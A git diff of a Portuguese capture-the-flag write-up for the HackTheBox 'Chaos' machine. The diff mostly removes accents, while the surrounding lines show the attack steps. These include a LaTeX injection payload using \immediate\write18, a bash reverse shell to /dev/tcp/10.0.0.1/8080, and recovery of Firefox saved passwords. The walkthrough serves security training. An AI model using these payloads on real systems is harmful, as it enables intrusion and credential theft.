@@ -1,14 +1,16 @@
+# chaos
+
 ![1](https://i.imgur.com/AE94mPY.png)
 
 
-Antes de iniciar a solucão, adicionei as seguintes alteracões ao **/etc/hosts**:
+Antes de iniciar a solucao, adicionei as seguintes alteracoes ao **/etc/hosts**:
 
 
 ![2](https://i.imgur.com/xdDvqbb.png)
 
 
 ---
-# Enumeracão
+# Enumeracao
 Iniciando com o nmap, e possivel visualizar alguns servicos e portas:
 
 
@@ -18,14 +20,14 @@ Iniciando com o nmap, e possivel visualizar alguns servicos e portas:
 ![3](https://i.imgur.com/ZL1o8nA.png)
 
 
-Nos temos http na porta 80 , servicos relacionados a email (imap, pop3) em execucão nas portas 110, 143, 993 e 995.
+Nos temos http na porta 80 , servicos relacionados a email (imap, pop3) em execucao nas portas 110, 143, 993 e 995.
 Comecando pelo http:
 
 
 ![4](https://i.imgur.com/UbjMbRR.png)
 
 
-Apos uns minutos revirando, não encontrei nenhuma informacão util e segui.
+Apos uns minutos revirando, nao encontrei nenhuma informacao util e segui.
 Utilizando o gobuster em **chaos.htb** recebemos:
 
 
@@ -143,7 +145,7 @@ def getKey(password):
             hasher = SHA256.new(password.encode('utf-8'))
             return hasher.digest()
 ```
-O script usa criptografia AES para fazer a codificacão, logo, precisamos de uma funcão que faca o processo contrario.  
+O script usa criptografia AES para fazer a codificacao, logo, precisamos de uma funcao que faca o processo contrario.  
 ```
 from Crypto.Hash import SHA256
 from Crypto.Cipher import AES  
@@ -178,14 +180,14 @@ Check the enmsg.txt
 You are the password XD."
 ```
 
-Então, usamos nosso nome **"sahay"** como senha.
+Entao, usamos nosso nome **"sahay"** como senha.
 A saida:
 
 
 ![10](https://i.imgur.com/CE5E6WI.png)
 
 
-## Exploracão e obtencão de shell
+## Exploracao e obtencao de shell
 
 
 Acessando `http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3`, temos:
@@ -194,7 +196,7 @@ Acessando `http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3`, temos:
 ![11](https://i.imgur.com/WEBJxLo.png   )
 
 
-Utilizando um proxy e checando a saida desta requisicão, vemos:
+Utilizando um proxy e checando a saida desta requisicao, vemos:
 
 
 ![12](https://i.imgur.com/Fcrff2p.png)
@@ -203,11 +205,11 @@ Utilizando um proxy e checando a saida desta requisicão, vemos:
 * e Possivel vermos [pdfTeX](https://en.wikipedia.org/wiki/PdfTeX) no corpo da resposta
 
 
-Abusando do LaTeX injection, podemos obter uma possivel execucão de codigo remoto.
+Abusando do LaTeX injection, podemos obter uma possivel execucao de codigo remoto.
 A estrutura do payload: `\immediate\write18{env > output}` ou `\input{output}`. Outros exemplos podem ser encontrados em [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).
 
 
-Enviando uma requisicão de shell reversa, temos a saida:
+Enviando uma requisicao de shell reversa, temos a saida:
 
 
 payload: `bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'` [ encoded as url ]
@@ -284,7 +286,7 @@ E baixando localmente em nossa maquina, com:
 ![18](https://i.imgur.com/ZOlilEG.png   )
 
 
-apos o download, vemos que existe um arquivo chamado **bzo7sjt1.default** dentre varios outros. E, utilizando da ferramenta [Firefox_decrypt](https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py), podemos fazer a decodificacão do nosso arquivo *.default. Logo apos o download e execucão da ferramenta, ele nos solicita uma Senha.
+apos o download, vemos que existe um arquivo chamado **bzo7sjt1.default** dentre varios outros. E, utilizando da ferramenta [Firefox_decrypt](https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py), podemos fazer a decodificacao do nosso arquivo *.default. Logo apos o download e execucao da ferramenta, ele nos solicita uma Senha.
 Utilizando da senha `jiujitsu` do usuario `ayush` que conseguimos previamente, obtemos a saida do arquivo criptografado:
 
 
